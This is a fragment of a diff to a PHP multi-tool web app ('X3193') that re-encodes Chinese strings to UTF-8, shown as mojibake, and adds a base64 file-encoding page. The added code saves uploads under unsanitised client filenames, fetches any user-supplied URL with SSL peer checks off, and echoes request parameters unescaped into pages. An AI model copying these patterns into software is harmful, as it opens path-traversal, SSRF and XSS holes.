         echo "gd:when startTime='".date("Y",$sec+3600*8)."-".date("m",$sec+3600*8)."-".date("d",$sec+3600*8)."T".date("h",$sec+3600*8).":".date("i",$sec+3600*8).":".date("s",$sec+3600*8).".000Z' endTime='".date("Y",$sec+3600*8)."-".date("m",$sec+3600*8)."-".date("d",$sec+3600*8)."T".date("h",$sec+3600*(8+1)).":".date("i",$sec+3600*8).":".date("s",$sec+3600*8).".000Z'";
         return;
-        $str = 'ÌáĞÑ£º»î¶¯ÏêÇé @ 2010-09-21 (ÖÜ¶ş) ÏÂÎç7:52 - ÏÂÎç8:52 (robot@xiayu.x3193.cz.cc)';
-        echo substr($str,strpos($str,'£º')+2,strripos(substr($str,strpos($str,'£º')+1,strpos($str,'@')-1),'@')-2);
+        $str = 'æé†’ï¼šæ´»åŠ¨è¯¦æƒ… @ 2010-09-21 (å‘¨äºŒ) ä¸‹åˆ7:52 - ä¸‹åˆ8:52 (robot@xiayu.x3193.cz.cc)';
+        echo substr($str,strpos($str,'ï¼š')+2,strripos(substr($str,strpos($str,'ï¼š')+1,strpos($str,'@')-1),'@')-2);
         echo "\r\n";
 
         date_default_timezone_set('UTC'); 
@@ -1329,7 +2814,7 @@ Received: (qmail 0 invoked by uid 65534); 1 Thu 2003 00:00:00 +0000';
          
         echo substr(sprintf('%o', fileperms('/')), -4);   
         echo "\r\n";
-        echo str_replace("¡£",".......","ÎÒ¡°ÎÒ£¡ÎÒ¡£ÎÒ£¬ÎÒ£¡ÎÒ£ºÎÒ£»ÎÒ£¿ÎÒ£º");       
+        echo str_replace("ã€‚",".......","æˆ‘â€œæˆ‘ï¼æˆ‘ã€‚æˆ‘ï¼Œæˆ‘ï¼æˆ‘ï¼šæˆ‘ï¼›æˆ‘ï¼Ÿæˆ‘ï¼š");       
 
 	break;
     case "360safe":
@@ -1440,8 +2925,12 @@ Received: (qmail 0 invoked by uid 65534); 1 Thu 2003 00:00:00 +0000';
         else{
                 //mail('xcy6272003@126.com','x3193@web.x3193.cz.cc',$emailcontent.'server'.$_SERVER['REMOTE_HOST'].'IP:'.$_SERVER['REMOTE_ADDR'].strlen($_SERVER['REMOTE_ADDR']).'cliet:'.$_SERVER['SERVER_NAME'].'nr:'.'index.php'.' or '.$xmlstr.file_get_contents('php://stdin').time());
         } 
-
-        bing();	
+				if($verifyflag=='1'){
+        	bing();	
+        }else{
+        	echo "<script>window.location = \"".httppath()."?api=fm"."\" ;</script>";
+					exit;		
+        }
         //gmap2();
 	break;
 }
@@ -1457,7 +2946,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
 }
 
 $runtime= new runtime;
-echo "¼ÓÔØÊ±¼ä: ".round($runtime->get_microtime()-$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['runime']['start'],3)." Ãë";
+echo "åŠ è½½æ—¶é—´: ".round($runtime->get_microtime()-$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['runime']['start'],3)." ç§’";
 
 ?>
 
@@ -1481,6 +2970,143 @@ function cdndown($filename){
 }
 ?>
 
+<?php
+function file64() { // bing function start 
+if (trim(request('action')) == "download"){
+    Header("Content-Type: audio/x-wav; samplerate=16000");
+		if(trim(request("download"))!=''){    
+    	header("Content-Disposition: attachment; filename=".trim(time()).".wav");	
+    }
+    $bing_search = new bing_class();
+    print_r($bing_search->bingtts(trim(request('content')),trim(request('lang'))));//"Web,ç½‘é¡µ|News,æ–°é—»|Image,å›¾ç‰‡";
+    exit;
+}else{
+	header('Content-Type: text/html; charset=utf-8');
+}
+
+?>
+<head>
+<?php 
+$style = new css();
+$style->ico();
+ 
+$style->title("X3193 - ".("æ–‡ä»¶ç¼–ç "));
+        
+$skincolor = selstyle(trim(request("skin")));
+$sCrLf = chr(13) . chr(10); // å›è½¦ + æ¢è¡Œ        
+?>
+
+<table width="100%" height="90%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
+        <tr>
+                <td align="center" valign="center">
+<table width="95%" height="30" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
+        <tr class="tdbg">
+                <td align="left" style="<?php $style->selcolor($skincolor,'tdbg');?>">
+                <?php  selskin(); ?>
+                </td>
+                <td align="right" style="<?php $style->selcolor($skincolor,'tdbg');?>">             
+                        <?php  
+                        	 IF(!is_wap())
+                        	sellink("ä¸»é¡µ|æ’ä»¶|æœç´¢|åŸŸå|FTP|æ¸¸æˆ|è§†é¢‘|æ–‡ç®¡|ç»ˆç«¯|è‚¡ç¥¨|VPN",$skincolor);
+                        else
+                        	sellink("ä¸»é¡µ|æœç´¢|åŸŸå|FTP|è§†é¢‘|æ–‡ç®¡|ç»ˆç«¯",$skincolor);
+
+                ?>
+
+                </td>
+        </tr>
+</table>
+<table width="95%" height="1" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
+        <tr>
+                <td align="left">
+                        
+                </td>
+        </tr>   
+</table>
+<table width="95%" height="70" align="center" valign="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
+        <form enctype="multipart/form-data" action="<?php echo ScriptPath();?>?api=file64&action=<?php echo encodeuri("base64.create")."&skin=".$skincolor;?>&refer=<?php echo encodeuri(trim($_SERVER['HTTP_REFERER']));?>&post=1" method="POST" name="file64">
+        <tr>
+                <td align="center">
+                        <input class="input" border="0" style="width:200px;height:30px;" type="text" name="fileurl" id="fileurl" value="<?php if( trim(request("fileurl"))!='') {echo trim(request("fileurl")); }else {echo 'æ–‡ä»¶ç½‘å€';} ?>"  />
+
+											<?php
+											if(is_wap()){
+											?>
+                      <input style="width:150px;height:30px;" type="file" name="filepath" id="filepath" />
+											<?php
+											}else{
+											?>
+                      <input style="width:150px;height:30px;display:none" type="file" name="filepath" id="filepath" />	
+											<input class="sotoolbar button" border="0" <?php  $style->input("#f9f9f9","");?> style="width:50px;height:30px;<?php $style->selcolor($skincolor,'tdbg');?>"
+											 type="button" id='fileup' onclick='javascript:document.getElementById("filepath").click()' value="æ–‡ä»¶" />
+											<?php
+											}
+											?>	
+											
+                        <input border="0" class="sotoolbar button" name="btnSubmit" style="width:<?php echo browser()=='ie'?'60px':'100px'?>;height:<?php echo browser()=='ie'?'20px':'30px'?>;<?php $style->selcolor($skincolor,'tdbg');?>" <?php  $style->input("#f9f9f9","");?> id=bsubmit value="ç”Ÿæˆå¯†ç " type="submit" />
+                </td>                
+        </tr>
+</table>
+</form>
+<?php 
+
+        	if (trim(request("action"))=="base64.create"){
+        			$filemimes='123;application/vnd.lotus-1-2-3||3gp;video/3gpp||aab;application/x-authoware-bin||aam;application/x-authoware-map||aas;application/x-authoware-seg||ai;application/postscript||aif;audio/x-aiff||aifc;audio/x-aiff||aiff;audio/x-aiff||als;audio/X-Alpha5||amc;application/x-mpeg||ani;application/octet-stream||asc;text/plain||asd;application/astound||asf;video/x-ms-asf||asn;application/astound||asp;application/x-asap||asx;video/x-ms-asf||au;audio/basic||avb;application/octet-stream||avi;video/x-msvideo||awb;audio/amr-wb||bcpio;application/x-bcpio||bin;application/octet-stream||bld;application/bld||bld2;application/bld2||bmp;application/x-MS-bmp||bpk;application/octet-stream||bz2;application/x-bzip2||cal;image/x-cals||ccn;application/x-cnc||cco;application/x-cocoa||cdf;application/x-netcdf||cgi;magnus-internal/cgi||chat;application/x-chat||class;application/octet-stream||clp;application/x-msclip||cmx;application/x-cmx||co;application/x-cult3d-object||cod;image/cis-cod||cpio;application/x-cpio||cpt;application/mac-compactpro||crd;application/x-mscardfile||csh;application/x-csh||csm;chemical/x-csml||csml;chemical/x-csml||css;text/css||cur;application/octet-stream||dcm;x-lml/x-evm||dcr;application/x-director||dcx;image/x-dcx||dhtml;text/html||dir;application/x-director||dll;application/octet-stream||dmg;application/octet-stream||dms;application/octet-stream||doc;application/msword||dot;application/x-dot||dvi;application/x-dvi||dwf;drawing/x-dwf||dwg;application/x-autocad||dxf;application/x-autocad||dxr;application/x-director||ebk;application/x-expandedbook||emb;chemical/x-embl-dl-nucleotide||embl;chemical/x-embl-dl-nucleotide||eps;application/postscript||eri;image/x-eri||es;audio/echospeech||esl;audio/echospeech||etc;application/x-earthtime||etx;text/x-setext||evm;x-lml/x-evm||evy;application/x-envoy||exe;application/octet-stream||fh4;image/x-freehand||fh5;image/x-freehand||fhc;image/x-freehand||fif;image/fif||fm;application/x-maker||fpx;image/x-fpx||fvi;video/isivideo||gau;chemical/x-gaussian-input||gca;application/x-gca-compressed||gdb;x-lml/x-gdb||gif;image/gif||gps;application/x-gps||gtar;application/x-gtar||gz;application/x-gzip||hdf;application/x-hdf||hdm;text/x-hdml||hdml;text/x-hdml||hlp;application/winhlp||hqx;application/mac-binhex40||htm;text/html||html;text/html||hts;text/html||ice;x-conference/x-cooltalk||ico;application/octet-stream||ief;image/ief||ifm;image/gif||ifs;image/ifs||imy;audio/melody||ins;application/x-NET-Install||ips;application/x-ipscript||ipx;application/x-ipix||it;audio/x-mod||itz;audio/x-mod||ivr;i-world/i-vrml||j2k;image/j2k||jad;text/vnd.sun.j2me.app-descriptor||jam;application/x-jam||jar;application/java-archive||jnlp;application/x-java-jnlp-file||jpe;image/jpeg||jpeg;image/jpeg||jpg;image/jpeg||jpz;image/jpeg||js;application/x-javascript||jwc;application/jwc||kjx;application/x-kjx||lak;x-lml/x-lak||latex;application/x-latex||lcc;application/fastman||lcl;application/x-digitalloca||lcr;application/x-digitalloca||lgh;application/lgh||lha;application/octet-stream||lml;x-lml/x-lml||lmlpack;x-lml/x-lmlpack||lsf;video/x-ms-asf||lsx;video/x-ms-asf||lzh;application/x-lzh||m13;application/x-msmediaview||m14;application/x-msmediaview||m15;audio/x-mod||m3u;audio/x-mpegurl||m3url;audio/x-mpegurl||ma1;audio/ma1||ma2;audio/ma2||ma3;audio/ma3||ma5;audio/ma5||man;application/x-troff-man||map;magnus-internal/imagemap||mbd;application/mbedlet||mct;application/x-mascot||mdb;application/x-msaccess||mdz;audio/x-mod||me;application/x-troff-me||mel;text/x-vmel||mi;application/x-mif||mid;audio/midi||midi;audio/midi||mif;application/x-mif||mil;image/x-cals||mio;audio/x-mio||mmf;application/x-skt-lbs||mng;video/x-mng||mny;application/x-msmoney||moc;application/x-mocha||mocha;application/x-mocha||mod;audio/x-mod||mof;application/x-yumekara||mol;chemical/x-mdl-molfile||mop;chemical/x-mopac-input||mov;video/quicktime||movie;video/x-sgi-movie||mp2;audio/x-mpeg||mp3;audio/x-mpeg||mp4;video/mp4||mpc;application/vnd.mpohun.certificate||mpe;video/mpeg||mpeg;video/mpeg||mpg;video/mpeg||mpg4;video/mp4||mpga;audio/mpeg||mpn;application/vnd.mophun.application||mpp;application/vnd.ms-project||mps;application/x-mapserver||mrl;text/x-mrml||mrm;application/x-mrm||ms;application/x-troff-ms||mts;application/metastream||mtx;application/metastream||mtz;application/metastream||mzv;application/metastream||nar;application/zip||nbmp;image/nbmp||nc;application/x-netcdf||ndb;x-lml/x-ndb||ndwn;application/ndwn||nif;application/x-nif||nmz;application/x-scream||nokia-op-logo;image/vnd.nok-oplogo-color||npx;application/x-netfpx||nsnd;audio/nsnd||nva;application/x-neva1||oda;application/oda||oom;application/x-AtlasMate-Plugin||pac;audio/x-pac||pae;audio/x-epac||pan;application/x-pan||pbm;image/x-portable-bitmap||pcx;image/x-pcx||pda;image/x-pda||pdb;chemical/x-pdb||pdf;application/pdf||pfr;application/font-tdpfr||pgm;image/x-portable-graymap||pict;image/x-pict||pm;application/x-perl||pmd;application/x-pmd||png;image/png||pnm;image/x-portable-anymap||pnz;image/png||pot;application/vnd.ms-powerpoint||ppm;image/x-portable-pixmap||pps;application/vnd.ms-powerpoint||ppt;application/vnd.ms-powerpoint||pqf;application/x-cprplayer||pqi;application/cprplayer||prc;application/x-prc||proxy;application/x-ns-proxy-autoconfig||ps;application/postscript||ptlk;application/listenup||pub;application/x-mspublisher||pvx;video/x-pv-pvx||qcp;audio/vnd.qcelp||qt;video/quicktime||qti;image/x-quicktime||qtif;image/x-quicktime||r3t;text/vnd.rn-realtext3d||ra;audio/x-pn-realaudio||ram;audio/x-pn-realaudio||rar;application/x-rar-compressed||ras;image/x-cmu-raster||rdf;application/rdf+xml||rf;image/vnd.rn-realflash||rgb;image/x-rgb||rlf;application/x-richlink||rm;audio/x-pn-realaudio||rmf;audio/x-rmf||rmm;audio/x-pn-realaudio||rmvb;audio/x-pn-realaudio||rnx;application/vnd.rn-realplayer||roff;application/x-troff||rp;image/vnd.rn-realpix||rpm;audio/x-pn-realaudio-plugin||rt;text/vnd.rn-realtext||rte;x-lml/x-gps||rtf;application/rtf||rtg;application/metastream||rtx;text/richtext||rv;video/vnd.rn-realvideo||rwc;application/x-rogerwilco||s3m;audio/x-mod||s3z;audio/x-mod||sca;application/x-supercard||scd;application/x-msschedule||sdf;application/e-score||sea;application/x-stuffit||sgm;text/x-sgml||sgml;text/x-sgml||sh;application/x-sh||shar;application/x-shar||shtml;magnus-internal/parsed-html||shw;application/presentations||si6;image/si6||si7;image/vnd.stiwap.sis||si9;image/vnd.lgtwap.sis||sis;application/vnd.symbian.install||sit;application/x-stuffit||skd;application/x-Koan||skm;application/x-Koan||skp;application/x-Koan||skt;application/x-Koan||slc;application/x-salsa||smd;audio/x-smd||smi;application/smil||smil;application/smil||smp;application/studiom||smz;audio/x-smd||snd;audio/basic||spc;text/x-speech||spl;application/futuresplash||spr;application/x-sprite||sprite;application/x-sprite||spt;application/x-spt||src;application/x-wais-source||stk;application/hyperstudio||stm;audio/x-mod||sv4cpio;application/x-sv4cpio||sv4crc;application/x-sv4crc||svf;image/vnd||svg;image/svg-xml||svh;image/svh||svr;x-world/x-svr||swf;application/x-shockwave-flash||swfl;application/x-shockwave-flash||t;application/x-troff||tad;application/octet-stream||talk;text/x-speech||tar;application/x-tar||taz;application/x-tar||tbp;application/x-timbuktu||tbt;application/x-timbuktu||tcl;application/x-tcl||tex;application/x-tex||texi;application/x-texinfo||texinfo;application/x-texinfo||tgz;application/x-tar||thm;application/vnd.eri.thm||tif;image/tiff||tiff;image/tiff||tki;application/x-tkined||tkined;application/x-tkined||toc;application/toc||toy;image/toy||tr;application/x-troff||trk;x-lml/x-gps||trm;application/x-msterminal||tsi;audio/tsplayer||tsp;application/dsptype||tsv;text/tab-separated-values||tsv;text/tab-separated-values||ttf;application/octet-stream||ttz;application/t-time||txt;text/plain||ult;audio/x-mod||ustar;application/x-ustar||uu;application/x-uuencode||uue;application/x-uuencode||vcd;application/x-cdlink||vcf;text/x-vcard||vdo;video/vdo||vib;audio/vib||viv;video/vivo||vivo;video/vivo||vmd;application/vocaltec-media-desc||vmf;application/vocaltec-media-file||vmi;application/x-dreamcast-vms-info||vms;application/x-dreamcast-vms||vox;audio/voxware||vqe;audio/x-twinvq-plugin||vqf;audio/x-twinvq||vql;audio/x-twinvq||vre;x-world/x-vream||vrml;x-world/x-vrml||vrt;x-world/x-vrt||vrw;x-world/x-vream||vts;workbook/formulaone||wav;audio/x-wav||wax;audio/x-ms-wax||wbmp;image/vnd.wap.wbmp||web;application/vnd.xara||wi;image/wavelet||wis;application/x-InstallShield||wm;video/x-ms-wm||wma;audio/x-ms-wma||wmd;application/x-ms-wmd||wmf;application/x-msmetafile||wml;text/vnd.wap.wml||wmlc;application/vnd.wap.wmlc||wmls;text/vnd.wap.wmlscript||wmlsc;application/vnd.wap.wmlscriptc||wmlscript;text/vnd.wap.wmlscript||wmv;audio/x-ms-wmv||wmx;video/x-ms-wmx||wmz;application/x-ms-wmz||wpng;image/x-up-wpng||wpt;x-lml/x-gps||wri;application/x-mswrite||wrl;x-world/x-vrml||wrz;x-world/x-vrml||ws;text/vnd.wap.wmlscript||wsc;application/vnd.wap.wmlscriptc||wv;video/wavelet||wvx;video/x-ms-wvx||wxl;application/x-wxl||x-gzip;application/x-gzip||xar;application/vnd.xara||xbm;image/x-xbitmap||xdm;application/x-xdma||xdma;application/x-xdma||xdw;application/vnd.fujixerox.docuworks||xht;application/xhtml+xml||xhtm;application/xhtml+xml||xhtml;application/xhtml+xml||xla;application/vnd.ms-excel||xlc;application/vnd.ms-excel||xll;application/x-excel||xlm;application/vnd.ms-excel||xls;application/vnd.ms-excel||xlt;application/vnd.ms-excel||xlw;application/vnd.ms-excel||xm;audio/x-mod||xml;text/xml||xmz;audio/x-mod||xpi;application/x-xpinstall||xpm;image/x-xpixmap||xsit;text/xml||xsl;text/xml||xul;text/xul||xwd;image/x-xwindowdump||xyz;chemical/x-pdb||yz1;application/x-yz1||z;application/x-compress||zac;application/x-zaurus-zac||zip;application/zip';
+        			if($_FILES['filepath']['name'] != ""){
+        			copy($_FILES['filepath']['tmp_name'], "./tmp/".$_FILES['filepath']['name']);
+          $filebase64 =  'data:'.$_FILES['filepath']['type'].';base64,'.base64_encode(file_get_contents("./tmp/".$_FILES['filepath']['name']));
+          unlink("./tmp/".$_FILES['filepath']['name']);
+        		}
+        			elseif(geturlinfo(trim(request("fileurl")),'ext') != ""){
+		      $url = trim(request("fileurl"));
+		      	//echo geturlinfo($url,'ext');
+		      	//exit;		      
+		      for($i=0;$i<count(split('[||]',$filemimes));$i++){
+		      	if(geturlinfo($url,'ext')==arrmember(split('[;]',arrmember(split('[||]',$filemimes),$i)),'0')){
+		      		$filemime = arrmember(split('[;]',arrmember(split('[||]',$filemimes),$i)),'1');
+		      		//echo arrmember(split('[;]',arrmember(split('[||]',$filemimes),$i)),'0');
+		      		break;	
+		      	}
+		    	}
+          $postdata = '';
+          //$header[] = "Content-Type: text/xml; charset=utf-8";
+          //$header[] = "Content-length: ".strlen($postdata);
+          $ch = curl_init();
+          curl_setopt($ch, CURLOPT_URL, $url);
+          curl_setopt($ch, CURLOPT_HEADER, 0);
+          //curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
+          //curl_setopt($ch, CURLOPT_USERPWD, $this->accountkey.':'.$this->accountkey);
+          //curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
+          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+          curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
+          //curl_setopt($ch, CURLOPT_POST, 1);
+          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
+          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);          
+          //curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
+          $jsonarray = curl_exec($ch);
+          //return($jsonarray); 
+          curl_close($ch); 
+          $filebase64 =  'data:'.$filemime.';base64,'.base64_encode($jsonarray);			
+        		}
+
+                	?>
+
+<table style="width:95%;height:500px;" align="center" valign="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
+        <tr>      	
+                <td align="center" class="tdbg" valign='middle'  style="<?php $style->selcolor($skincolor,'tdbg');?>">
+                      <textarea class="textarea" border="0" style="width:95%;height:90%;" type="text" name="filebase64" id="filebase64" value="" rows="20" cols="80" /><?php echo $filebase64;?></textarea>         
+                </td>  
+                       	
+        </tr>        
+</table>
+
+                	<?php 
+         }
+
+$style->footer();
+return;
+}
+?>
 
 <?php
 function randwork(){
@@ -1523,7 +3149,9 @@ $getaccesstoken=$fetion->getaccesstoken();
 echo $getaccesstoken['access_token'].' ';
 $getuseropenid=$fetion->getuseropenid($getaccesstoken['access_token'],'');
 print_r($getuseropenid['data']['openid'][0].' ');
-$sendtextmsg=$fetion->sendtextmsg($getaccesstoken['access_token'],$getuseropenid['data']['openid'][0],'lswii');
+//$sendtextmsg=$fetion->sendtextmsg($getaccesstoken['access_token'],$getuseropenid['data']['openid'][0],'lswii');
+//print_r($sendtextmsg);
+$sendtextmsg=$fetion->sendmsg('','æˆ‘lswii');
 print_r($sendtextmsg);
 ?>	
 
@@ -1575,26 +3203,26 @@ function baidu(){
 
 <?php 
 function meitu(){
-header('Content-Type: text/html; charset=gb2312');
+header('Content-Type: text/html; charset=utf-8');
 ?>	
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html>
 <head>
-<title>ÃÀÍ¼WEB¿ª·ÅÆ½Ì¨</title>
+<title>ç¾å›¾WEBå¼€æ”¾å¹³å°</title>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <script src="http://open.web.meitu.com/sources/xiuxiu.js" type="text/javascript"></script>
 <script type="text/javascript">
 window.onload=function(){
   xiuxiu.embedSWF("altContent",3,"100%","100%");
-  /*µÚ1¸ö²ÎÊıÊÇ¼ÓÔØ±à¼­Æ÷divÈİÆ÷£¬µÚ2¸ö²ÎÊıÊÇ±à¼­Æ÷ÀàĞÍ£¬µÚ3¸ö²ÎÊıÊÇdivÈİÆ÷¿í£¬µÚ4¸ö²ÎÊıÊÇdivÈİÆ÷¸ß*/
-  xiuxiu.setUploadURL("<?php echo trim(request('uploadurl'))?>");//ĞŞ¸ÄÎªÉÏ´«½ÓÊÕÍ¼Æ¬³ÌĞòµØÖ·
+  /*ç¬¬1ä¸ªå‚æ•°æ˜¯åŠ è½½ç¼–è¾‘å™¨divå®¹å™¨ï¼Œç¬¬2ä¸ªå‚æ•°æ˜¯ç¼–è¾‘å™¨ç±»å‹ï¼Œç¬¬3ä¸ªå‚æ•°æ˜¯divå®¹å™¨å®½ï¼Œç¬¬4ä¸ªå‚æ•°æ˜¯divå®¹å™¨é«˜*/
+  xiuxiu.setUploadURL("<?php echo trim(request('uploadurl'))?>");//ä¿®æ”¹ä¸ºä¸Šä¼ æ¥æ”¶å›¾ç‰‡ç¨‹åºåœ°å€
   xiuxiu.onInit = function ()
   {
-    xiuxiu.loadPhoto("<?php echo trim(request('picurl'))?>");//ĞŞ¸ÄÎªÒª´¦ÀíµÄÍ¼Æ¬url
+    xiuxiu.loadPhoto("<?php echo trim(request('picurl'))?>");//ä¿®æ”¹ä¸ºè¦å¤„ç†çš„å›¾ç‰‡url
   }
   xiuxiu.onUploadResponse = function (data)
   {
-    //alert("ÉÏ´«ÏìÓ¦" + data); ¿ÉÒÔ¿ªÆôµ÷ÊÔ
+    //alert("ä¸Šä¼ å“åº”" + data); å¯ä»¥å¼€å¯è°ƒè¯•
   }
 }
 </script>
@@ -1605,7 +3233,7 @@ window.onload=function(){
 </head>
 <body>
 <div id="altContent">
-	<h1>ÃÀÍ¼ĞãĞã</h1>
+	<h1>ç¾å›¾ç§€ç§€</h1>
 </div>
 </body>
 </html>
@@ -1615,14 +3243,14 @@ window.onload=function(){
 
 <?php 
 function discuz(){
-header('Content-Type: text/html; charset=gb2312');
+header('Content-Type: text/html; charset=utf-8');
 
 switch (trim(request('action'))) {
          				case "ths":
                	?>
 
 <div align="center">
-<iframe id="ths" name="ths" frameborder="0" src="http://www.10jqka.com.cn/flash/" width="100%"  height="550px" scrolling="no">Í¬»¨Ë³flash¹ÉÊĞĞĞÇé</iframe>
+<iframe id="ths" name="ths" frameborder="0" src="http://www.10jqka.com.cn/flash/" width="100%"  height="550px" scrolling="no">åŒèŠ±é¡ºflashè‚¡å¸‚è¡Œæƒ…</iframe>
 </div> 
             	
                	<?php 
@@ -1638,7 +3266,7 @@ switch (trim(request('action'))) {
                	?>
 
 <div align="center">
-<iframe id="TV123456789" name="TV123456789" frameborder="0" src="http://www.tv123456789.com/live.asp" width="100%"  height="550px" scrolling="no">TV123456789»ã¼¯ËùÓĞÎÀĞÇµçÊÓÍøÂçµçÊÓÔÚÏßÖ±²¥</iframe>
+<iframe id="TV123456789" name="TV123456789" frameborder="0" src="http://www.tv123456789.com/live.asp" width="100%"  height="550px" scrolling="no">TV123456789æ±‡é›†æ‰€æœ‰å«æ˜Ÿç”µè§†ç½‘ç»œç”µè§†åœ¨çº¿ç›´æ’­</iframe>
 </div> 
             	
                	<?php 
@@ -1663,15 +3291,15 @@ switch (trim(request('action'))) {
 
 <?php 
 function wiqet(){ // idoll function start
-header('Content-Type: text/html; charset=gb2312');
+header('Content-Type: text/html; charset=utf-8');
 ?>
 <head>
 <?php 
 $style = new css();
 $style->ico();
-$style->title("X3193 - ¶àÃ½Ìå");
+$style->title("X3193 - å¤šåª’ä½“");
 $skincolor = selstyle(trim(request("skin")));
-$sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
+$sCrLf = chr(13) . chr(10); // å›è½¦ + æ¢è¡Œ
 ?>
 
 <table width="100%" height="120%" align="center" valign="center">
@@ -1685,9 +3313,9 @@ $sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
                 <td align="right" style="border:0">             
                         <?php  
                          IF(!is_wap())
-                        	sellink("Ö÷Ò³|²å¼ş|ËÑË÷|ÓòÃû|FTP|¶ÁÊé|ÓÎÏ·|¶ÌÆ¬|¹ÉÆ±|VPN",$skincolor);
+                        	sellink("ä¸»é¡µ|æ’ä»¶|æœç´¢|åŸŸå|FTP|è¯»ä¹¦|æ¸¸æˆ|çŸ­ç‰‡|è‚¡ç¥¨|VPN",$skincolor);
                         else
-                        	sellink("Ö÷Ò³|ËÑË÷|ÓòÃû|FTP|¶ÌÆ¬",$skincolor);
+                        	sellink("ä¸»é¡µ|æœç´¢|åŸŸå|FTP|çŸ­ç‰‡",$skincolor);
                         ?>
                 </td>
         </tr>           
@@ -1776,14 +3404,14 @@ function fpdf(){
 //$pdf->AddBig5Font();
 //$pdf->AddPage();
 //$pdf->SetFont('Big5','',20);
-//$pdf->Write(10,'²{®É®ğ·Å 18 C Àã«× 83 %');
+//$pdf->Write(10,'ç·î† î‡‡æ”¾ 18 C æ¥î‚” 83 %');
 //$pdf->Output();
 
 $pdf=new PDF_Chinese(); 
 $pdf->AddGBFont(); 
 $pdf->AddPage(); 
 $pdf->SetFont('GB','',20); 
-$pdf->Write(10,'¼òÌåÖĞÎÄºº×Ö'); 
+$pdf->Write(10,'ç®€ä½“ä¸­æ–‡æ±‰å­—'); 
 $pdf->Output(); 
 }
 ?>
@@ -1915,7 +3543,7 @@ vmware_bridge=1
 
 MEDIA=rastapi
 Port=VPN2-0
-Device=WAN <?php echo iconv('gb2312','utf-8','Î¢ĞÍ¶Ë¿Ú')?> (L2TP)
+Device=WAN <?php echo iconv('gb2312','utf-8','å¾®å‹ç«¯å£')?> (L2TP)
 DEVICE=vpn
 PhoneNumber=<?php echo trim(request("servername")).$sCrLf;?>  
 AreaCode=
@@ -1931,16 +3559,16 @@ TryNextAlternateOnFail=1
     	case "download": 
       If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
         if (trim(request("checkcode")) != ""){
-         	AlertBack("ËÄÎ»ÑéÖ¤Âë´íÎó£¡" , 1);
+         	AlertBack("å››ä½éªŒè¯ç é”™è¯¯ï¼" , 1);
         	break;
         }       
         elseif (trim(request("checkcode")) == ""){
-         AlertBack("ËÄÎ»ÑéÖ¤ÂëÎª¿Õ£¡" , 1);
+         AlertBack("å››ä½éªŒè¯ç ä¸ºç©ºï¼" , 1);
          break;
       	}               
       } 
       if (trim(request("servername")) == "" || trim(request("vpnname")) == ""){
-        AlertBack("·şÎñÆ÷»òÁ¬½ÓÃûÎª¿Õ£¡" , 1);
+        AlertBack("æœåŠ¡å™¨æˆ–è¿æ¥åä¸ºç©ºï¼" , 1);
         break;
       }
 	else{
@@ -1961,7 +3589,7 @@ TryNextAlternateOnFail=1
 session_start();
 $skincolor = selstyle(trim(request("skin")));
 
-$sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
+$sCrLf = chr(13) . chr(10); // å›è½¦ + æ¢è¡Œ
 ?>
 <head>
 <?php 
@@ -1981,9 +3609,9 @@ $style->title("X3193 - VPN");
                 <td align="right" style="border:0">             
                         <?php  
                          IF(!is_wap())
-                        	sellink("Ö÷Ò³|²å¼ş|ËÑË÷|ÓòÃû|FTP|¶ÁÊé|ÓÎÏ·|¶ÌÆ¬|¹ÉÆ±|VPN",$skincolor);
+                        	sellink("ä¸»é¡µ|æ’ä»¶|æœç´¢|åŸŸå|FTP|è¯»ä¹¦|æ¸¸æˆ|çŸ­ç‰‡|è‚¡ç¥¨|VPN",$skincolor);
                         else
-                        	sellink("Ö÷Ò³|ËÑË÷|ÓòÃû|FTP|¶ÌÆ¬",$skincolor);
+                        	sellink("ä¸»é¡µ|æœç´¢|åŸŸå|FTP|çŸ­ç‰‡",$skincolor);
                         ?>
                 </td>
         </tr>           
@@ -2011,9 +3639,9 @@ function changeimg()
         <tr class="tdtbg" height="35" valign="center">
                 <td align="center" valign="center" id="google">
                         <form action="<?php echo ScriptPath();?>?api=vpn&action=<?php  echo encodeuri("download");?>&skin=<?php  echo $skincolor;?>" method="post" name="vpn">
-                        &nbsp·şÎñÆ÷ÓòÃû£º<input type="text" class="text" name="servername" value="<?php echo $vpnserver;?>" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
-                        &nbspÍøÂçÁ¬½ÓÃû£º<input type="text" class="text" name="vpnname" value="<?php echo strtoupper($regsite);?>" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
-                        &nbspÑéÖ¤Âë£º<input <?php  $style->input("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="¿´²»Çå³ş£¿»»Ò»¸ö£¡"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
+                        &nbspæœåŠ¡å™¨åŸŸåï¼š<input type="text" class="text" name="servername" value="<?php echo $vpnserver;?>" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
